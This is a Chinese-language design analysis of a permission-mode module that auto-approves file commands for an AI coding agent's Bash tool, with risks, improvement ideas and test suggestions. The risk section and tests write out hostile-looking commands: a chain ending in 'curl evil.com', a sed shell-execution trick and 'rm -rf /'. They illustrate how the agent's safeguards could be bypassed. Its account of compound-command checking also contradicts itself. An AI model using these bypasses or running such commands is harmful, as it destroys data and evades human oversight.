# modeValidation.ts 研究文档

## 场景与职责

`modeValidation.ts` 是 BashTool 的**权限模式验证模块**，负责根据当前的权限模式（如 `acceptEdits` 模式）决定是否自动批准特定命令。该模块是权限系统的关键组件，实现了基于模式的命令白名单机制。

### 核心职责
1. **模式感知验证**：根据 `toolPermissionContext.mode` 应用不同的验证规则
2. **Accept Edits 模式支持**：在 `acceptEdits` 模式下自动允许文件系统操作命令
3. **权限结果生成**：返回标准化的 `PermissionResult`，指示 `allow`、`ask` 或 `passthrough`

## 功能点目的

### 1. Accept Edits 模式
`acceptEdits` 模式是一种特殊的权限模式，允许自动批准特定的文件系统操作命令，无需用户确认。这适用于用户明确希望 Claude 可以修改代码的场景。

### 2. 自动允许的命令
```typescript
const ACCEPT_EDITS_ALLOWED_COMMANDS = [
  'mkdir', 'touch', 'rm', 'rmdir', 'mv', 'cp', 'sed'
] as const
```

这些命令被选中是因为：
- 它们是常见的代码编辑操作
- 它们有明确的文件系统影响
- 它们可以被路径验证系统充分约束

### 3. 权限结果类型
```typescript
type PermissionResult = {
  behavior: 'allow' | 'ask' | 'deny' | 'passthrough'
  message?: string
  updatedInput?: { command: string }
  decisionReason?: { type: string; mode?: string; reason?: string }
  blockedPath?: string
  suggestions?: PermissionUpdate[]
}
```

## 具体技术实现

### 关键流程

#### 1. 主入口函数
```typescript
export function checkPermissionMode(
  input: z.infer<typeof BashTool.inputSchema>,
  toolPermissionContext: ToolPermissionContext,
): PermissionResult
```

**流程**：
1. 检查是否为 `bypassPermissions` 模式 → `passthrough`
2. 检查是否为 `dontAsk` 模式 → `passthrough`（在其他地方处理）
3. 分割复合命令
4. 对每个子命令调用 `validateCommandForMode`
5. 返回第一个非 `passthrough` 结果，或最终 `passthrough`

#### 2. 命令验证逻辑
```typescript
function validateCommandForMode(
  cmd: string,
  toolPermissionContext: ToolPermissionContext,
): PermissionResult
```

**关键逻辑**：
```typescript
// In Accept Edits mode, auto-allow filesystem operations
if (
  toolPermissionContext.mode === 'acceptEdits' &&
  isFilesystemCommand(baseCmd)
) {
  return {
    behavior: 'allow',
    updatedInput: { command: cmd },
    decisionReason: {
      type: 'mode',
      mode: 'acceptEdits',
    },
  }
}
```

#### 3. 文件系统命令检测
```typescript
function isFilesystemCommand(command: string): command is FilesystemCommand {
  return ACCEPT_EDITS_ALLOWED_COMMANDS.includes(command as FilesystemCommand)
}
```

使用 TypeScript 的类型谓词确保类型安全。

### 辅助函数

#### getAutoAllowedCommands
```typescript
export function getAutoAllowedCommands(
  mode: ToolPermissionContext['mode'],
): readonly string[]
```

返回指定模式下自动允许的命令列表，用于 UI 显示和文档。

## 关键代码路径与文件引用

### 导出函数
- `checkPermissionMode`: 主入口函数
- `getAutoAllowedCommands`: 获取自动允许命令列表

### 依赖关系
```typescript
import type { z } from 'zod/v4'
import type { ToolPermissionContext } from '../../Tool.js'
import { splitCommand_DEPRECATED } from '../../utils/bash/commands.js'
import type { PermissionResult } from '../../utils/permissions/PermissionResult.js'
import type { BashTool } from './BashTool.js'
```

### 调用方
- `src/tools/BashTool/bashPermissions.ts`: 主权限检查流程
  ```typescript
  import { checkPermissionMode } from './modeValidation.js'
  // 在 bashToolHasPermission 中调用
  const modeResult = checkPermissionMode(input, toolPermissionContext)
  ```

- `src/tools/PowerShellTool/modeValidation.ts`: PowerShell 版本的类似实现

### 相关文件
- `src/tools/BashTool/bashPermissions.ts`: 主权限检查逻辑
- `src/tools/BashTool/pathValidation.ts`: 路径约束验证
- `src/utils/permissions/PermissionResult.ts`: 权限结果类型定义
- `src/Tool.ts`: `ToolPermissionContext` 类型定义

## 依赖与外部交互

### 运行时依赖
| 依赖 | 用途 |
|------|------|
| `zod/v4` | 输入 schema 类型推断 |
| `ToolPermissionContext` | 获取当前权限模式 |
| `splitCommand_DEPRECATED` | 分割复合命令 |
| `PermissionResult` | 返回类型定义 |
| `BashTool` | 输入 schema 类型 |

### 类型定义
```typescript
type FilesystemCommand = (typeof ACCEPT_EDITS_ALLOWED_COMMANDS)[number]
// = 'mkdir' | 'touch' | 'rm' | 'rmdir' | 'mv' | 'cp' | 'sed'
```

### 权限模式
```typescript
type PermissionMode = 
  | 'bypassPermissions'  // 完全绕过权限检查
  | 'dontAsk'           // 不询问但仍有约束
  | 'acceptEdits'       // 接受编辑（自动允许文件操作）
  | 'normal'            // 正常模式
```

## 风险、边界与改进建议

### 已知风险

1. **命令白名单的局限性**
   - 仅覆盖 7 个基本命令，可能遗漏其他编辑操作（如 `chmod`, `chown`）
   - 复杂的管道命令可能绕过白名单检查

2. **模式优先级问题**
   - `bypassPermissions` 和 `dontAsk` 返回 `passthrough`，依赖其他系统处理
   - 如果其他系统未正确处理，可能导致权限提升

3. **复合命令风险**
   ```bash
   # 只有第一个命令被检查
   rm file.txt && curl evil.com
   ```

4. **标志绕过**
   - 当前检查仅基于命令名，不检查标志
   - `sed` 可以执行任意代码：`sed -e 'exec /bin/sh'`

### 边界情况

| 场景 | 行为 | 说明 |
|------|------|------|
| 空命令 | `passthrough` | "Base command not found" |
| 未知命令 | `passthrough` | 无模式特定处理 |
| 非 acceptEdits 模式 | `passthrough` | 所有命令 |
| 带标志的命令 | 可能允许 | 仅检查基础命令名 |

### 改进建议

1. **扩展白名单**
   ```typescript
   const ACCEPT_EDITS_ALLOWED_COMMANDS = [
     'mkdir', 'touch', 'rm', 'rmdir', 'mv', 'cp', 'sed',
     'chmod', 'chown',      // 权限修改
     'ln', 'link',          // 链接创建
     'install',             // 文件安装
   ] as const
   ```

2. **命令标志验证**
   ```typescript
   // 对 sed 等危险命令添加标志检查
   if (baseCmd === 'sed') {
     if (containsDangerousSedFlags(args)) {
       return { behavior: 'ask', ... }
     }
   }
   ```

3. **复合命令深度检查**
   ```typescript
   // 检查所有子命令，而不仅仅是第一个
   for (const cmd of commands) {
     const result = validateCommandForMode(cmd, toolPermissionContext)
     if (result.behavior === 'ask') {
       return result  // 如果任何部分需要询问，整个命令询问
     }
   }
   ```

4. **模式继承**
   ```typescript
   // 允许子模式继承
   type ModeConfig = {
     autoAllow: string[]
     requirePathValidation: boolean
     maxCommandComplexity: number
   }
   ```

5. **审计日志**
   ```typescript
   // 记录自动允许的操作
   logEvent('auto_allowed_by_mode', {
     mode: 'acceptEdits',
     command: cmd,
     timestamp: Date.now(),
   })
   ```

### 安全考虑

1. **与路径验证的协作**
   - 当前设计依赖 `pathValidation.ts` 进行路径约束
   - 即使命令在白名单中，路径验证仍可能拒绝

2. **sed 的特殊处理**
   - `sed` 可以执行任意 shell 代码（`-e exec`）
   - 建议与 `sedValidation.ts` 集成，确保 `-e` 标志的安全性

3. **拒绝服务防护**
   ```typescript
   // 限制复合命令数量
   if (commands.length > MAX_COMMANDS) {
     return { behavior: 'ask', message: 'Too many commands' }
   }
   ```

### 测试建议

```typescript
describe('checkPermissionMode', () => {
  it('acceptEdits 模式允许 mkdir', () => {
    const result = checkPermissionMode(
      { command: 'mkdir foo' },
      { mode: 'acceptEdits', /* ... */ }
    )
    expect(result.behavior).toBe('allow')
  })
  
  it('acceptEdits 模式不允许未列出的命令', () => {
    const result = checkPermissionMode(
      { command: 'curl example.com' },
      { mode: 'acceptEdits', /* ... */ }
    )
    expect(result.behavior).toBe('passthrough')
  })
  
  it('bypassPermissions 模式返回 passthrough', () => {
    const result = checkPermissionMode(
      { command: 'rm -rf /' },
      { mode: 'bypassPermissions', /* ... */ }
    )
    expect(result.behavior).toBe('passthrough')
  })
})
```
